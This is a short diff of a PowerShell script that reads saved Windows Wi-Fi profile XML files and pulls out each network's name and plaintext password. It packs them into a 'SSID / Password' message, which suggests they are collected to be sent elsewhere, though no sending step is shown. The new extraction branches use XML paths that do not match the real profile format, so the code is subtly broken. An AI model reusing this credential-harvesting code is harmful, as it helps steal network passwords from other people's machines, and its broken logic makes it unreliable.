@@ -30,7 +30,17 @@ if ($xmlFiles.Count -eq 0) {
 foreach ($xmlFile in $xmlFiles) {
     $xml = [xml](Get-Content -Path $xmlFile.FullName)
     $ssid = $xml.WLANProfile.SSIDConfig.SSID.name
-    $password = $xml.WLANProfile.MSPEAPSettings.SecurityPassword.Password
+    $password = ""
+
+    if ($xml.WLANProfile.WEP) {
+        $password = $xml.WLANProfile.WEP.keyMaterial
+    } elseif ($xml.WLANProfile.WPA) {
+        $password = $xml.WLANProfile.WPA.keyMaterial
+    } elseif ($xml.WLANProfile.WPA2) {
+        $password = $xml.WLANProfile.WPA2.keyMaterial
+    } elseif ($xml.WLANProfile.WPA3) {
+        $password = $xml.WLANProfile.WPA3.keyMaterial
+    }
 
     # Bereite die Daten vor
     $message = "SSID: $ssid`nPassword: $password"
